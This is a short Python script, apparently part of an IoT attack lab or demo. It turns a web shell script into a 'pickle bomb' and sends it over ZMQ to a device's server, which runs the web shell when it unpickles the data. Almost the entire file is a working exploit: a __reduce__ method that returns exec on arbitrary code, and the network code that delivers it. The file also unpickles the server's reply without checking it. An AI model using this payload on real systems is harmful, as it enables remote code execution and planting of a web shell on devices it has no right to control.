#-----------------------------------------------------------------------------
# Name:        ZmqPickleBombSender.py
#
# Purpose:     This module is a used to convert the web attack script <flaskWebShellApp.py>
#              into a pickle bomb and send it to the server via ZMQ to the IoT 
#              device. The server will then execute the pickle bomb and the web shell.
#
# Version:     v_0.0.2
# Created:     2024/07/10
# Copyright:   Copyright (c) 2023 LiuYuancheng
# License:     MIT License
#-----------------------------------------------------------------------------

import zmq
import pickle

# Set the ZMQ server IP address and port number
#iotIP = '172.23.155.209'
iotIP = '127.0.0.1'
port = 3003
fileNameStr = 'flaskWebShellApp.py'

#-----------------------------------------------------------------------------
dataStr = ''
class PickleCodeBomb:
    def __reduce__(self):
        global dataStr
        return exec, (dataStr,)

#-----------------------------------------------------------------------------
# Connect to the server
context = zmq.Context()
print("Connecting to server...")
socket = context.socket(zmq.REQ)
socket.connect("tcp://%s:%s" %(iotIP,port))
print("Sending request btyes via ZMQ client:")
obj = None
try:
    with open(fileNameStr, 'r') as fh:
        dataStr = fh.read()
    obj = PickleCodeBomb()
except Exception as err:
    print("Error: can not read python file %s" % err)
    exit()
pickledata = pickle.dumps(obj, protocol=pickle.HIGHEST_PROTOCOL)
socket.send(pickledata)
#  Get the reply.
replyData = socket.recv()
print("Received reply bytes:")
print(str(replyData))
reqDict = pickle.loads(replyData)
print ("Received reply: \n %s" %str(reqDict))
